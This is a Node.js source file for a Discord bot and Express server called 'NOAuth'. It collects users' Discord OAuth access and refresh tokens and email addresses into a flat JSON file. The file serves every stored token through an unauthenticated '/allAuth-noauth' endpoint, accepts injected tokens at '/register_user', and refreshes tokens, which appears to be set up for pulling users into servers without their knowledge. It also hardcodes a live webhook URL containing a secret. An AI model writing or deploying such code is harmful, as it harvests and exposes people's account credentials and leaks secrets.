const {Client, Events, Collection} = require('discord.js');
const Constants = require('./constants');
const client = new Client({
  intents: 32767,
});
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('node:fs');
const path = require('node:path');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const axios = require('axios');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

/* EXPRESS JS */

app.get('/', function (req, res) {
  res.sendFile(__dirname + '/index.html');
});

app.post('/register_user', function (req, res) {
  const access_token = req.body.access_token;
  const refresh_token = req.body.refresh_token;
  const username = req.body.username;
  const mail = req.body.mail;
  const userID = req.body.userID;

  const objectData = fs.readFileSync('./object.json');
  const objectJson = JSON.parse(objectData);

  const newUser = {
    userID: userID,
    avatarURL : '',
    username: username,
    access_token: access_token,
    refresh_token: refresh_token,
    mail : mail,
  };

  objectJson.push(newUser);
  fs.writeFileSync('./object.json', JSON.stringify(objectJson));

  console.log(`[+] ${username} - ${userID}`);
  fetch(Constants.webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      avatar_url: '',
      embeds: [
        {
          color: Constants.color,
          title: `${newUser.username} - ${newUser.userID}`,
          description: `\`\`\`diff\n- New User\n\n- Pseudo: ${newUser.username}\n\n- ID: ${newUser.userID}\`\`\``,
        },
      ],
    }),
  });
  return res.json({ status: 'ok' });
});

app.get('/allAuth-noauth', async (req, res) => {
  fs.readFile('./object.json', function (err, data) {
    return res.json(JSON.parse(data));
  });
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;

  const formData = new URLSearchParams();
  formData.append('client_id', Constants.clientId);
  formData.append('client_secret', Constants.clientSecret);
  formData.append('grant_type', 'authorization_code');
  formData.append('redirect_uri', Constants.redirectUri);
  formData.append('scope', Constants.scope);
  formData.append('code', code);

  try {
    const tokenResponse = await fetch('https://discordapp.com/api/oauth2/token', {
      method: 'POST',
      body: formData,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    const tokenData = await tokenResponse.json();
    const accessToken = tokenData.access_token;
    const refreshToken = tokenData.refresh_token;
    const headersWithToken = { headers: { authorization: `${tokenData.token_type} ${accessToken}` } };
    const userDataResponse = await axios.get('https://discordapp.com/api/users/@me', headersWithToken);
    console.log(userDataResponse.data);

    const userId = userDataResponse.data.id;
    const objectData = fs.readFileSync('./object.json');
    const objectJson = JSON.parse(objectData);

    if (objectJson.some((user) => user.userID === userId)) {
      console.log(`[-] ${userDataResponse.data.username}#${userDataResponse.data.discriminator}`);
    } else {
      console.log(`[+] ${userDataResponse.data.username}#${userDataResponse.data.discriminator}`);
      const avatarUrl = `https://cdn.discordapp.com/avatars/${userDataResponse.data.id}/${userDataResponse.data.avatar}.png?size=4096`;

      fetch('https://ptb.discord.com/api/webhooks/997499223182413865/gbY6JFAR8XZ0haFyV6f31fe0p27Ms46VNh0rCYcO3UACZnZ5z82Qqnx9kXl6bLaAh_9Z', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          avatar_url: '',
          embeds: [
            {
              color: 3092790,
              title: `${userDataResponse.data.username}#${userDataResponse.data.discriminator} - ${userDataResponse.data.id}`,
              thumbnail: { url: avatarUrl },
              description: `\`\`\`diff\n- New User\n\n- Pseudo: ${userDataResponse.data.username}#${userDataResponse.data.discriminator}\n\n- ID: ${userDataResponse.data.id}\`\`\``,
            },
          ],
        }),
      });

      const newUser = {
        userID: userDataResponse.data.id,
        avatarURL: avatarUrl,
        username: `${userDataResponse.data.username}#${userDataResponse.data.discriminator}`,
        access_token: accessToken,
        refresh_token: refreshToken,
        mail : userDataResponse.data.email,
      };

      objectJson.push(newUser);
      fs.writeFileSync('./object.json', JSON.stringify(objectJson));
      res.redirect('/');
    }
  } catch (error) {
    console.log(error);
  }
});


async function renewToken(clientId, clientSecret, refreshToken) {
  try {
    const formData = new URLSearchParams();
    formData.append('client_id', clientId);
    formData.append('client_secret', clientSecret);
    formData.append('grant_type', 'refresh_token');
    formData.append('refresh_token', refreshToken);

    const response = await fetch('https://discordapp.com/api/oauth2/token', { 
      method: 'POST', 
      body: formData,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });

    if (!response.ok) {
      throw new Error(`Failed to renew token. Status: ${response.status}`);
    }

    const data = await response.json();
    return data.access_token;
  } catch (error) {
    console.error('Error renewing token:', error);
    throw error;
  }
}


/* load all commands */
client.commands = new Collection();
const foldersPath = path.join(__dirname, 'commands');
const commandFolders = fs.readdirSync(foldersPath);

for (const folder of commandFolders) {
	// Grab all the command files from the commands directory you created earlier
	const commandsPath = path.join(foldersPath, folder);
	const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
	// Grab the SlashCommandBuilder#toJSON() output of each command's data for deployment
	for (const file of commandFiles) {
		const filePath = path.join(commandsPath, file);
		const command = require(filePath);
		if ('data' in command && 'execute' in command) {
			client.commands.set(command.data.name, command);
		} else {
			console.log(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
		}
	}
}


/* DISCORD BOT */

client.on("ready", () => {
  console.log(`${chalk.blue('NOAuth')}\n${chalk.green('->')} Le bot est connecté en tant que [ ${client.user.username} ], il utilise comme prefix : ${Constants.prefix}\n${chalk.green('->')} L'invite du bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`);
  client.user.setActivity("en légende", {
    type: "WATCHING",
    //url: "https://www.twitch.tv/monstercat"
  });
});

client.on('guildMemberAdd', async (member) => {
  const userId = member.user.id;
  const data = await fetch(`http://127.0.0.1:8000/join/?userID=${userId}&guildID=${Constants.guildId}`, { method: 'POST' });
  if (data.status !== 200) {
    console.log(`Error while adding user ${userId} to the database. Status: ${data.status}`);
    return;
  } else {
    console.log(`New member joined! User ID: ${userId}`);
  }
});

client.on('guildMemberRemove', (member) => {
  const userId = member.user.id;
  console.log(`Member left! User ID: ${userId}`);
});


client.on("messageCreate", async (message) => {
  if (!message.guild || message.author.bot) return;

});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

	const command = interaction.client.commands.get(interaction.commandName);

	if (!command) {
		console.error(`No command matching ${interaction.commandName} was found.`);
		return;
	}
  

	try {
		await command.execute(interaction);
	} catch (error) {
		console.error(error);
		if (interaction.replied || interaction.deferred) {
			await interaction.followUp({ content: 'There was an error while executing this command!', ephemeral: true });
		} else {
			await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
		}
  }
});


function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}
  

/* LAUNCHING DISCORD AND EXPRESS SERVERS */

client.login(Constants.token).catch(() => {
    throw new Error(`TOKEN OR INTENT INVALID`);
});
  
app.listen(Constants.port, () => console.log('Connexion...'));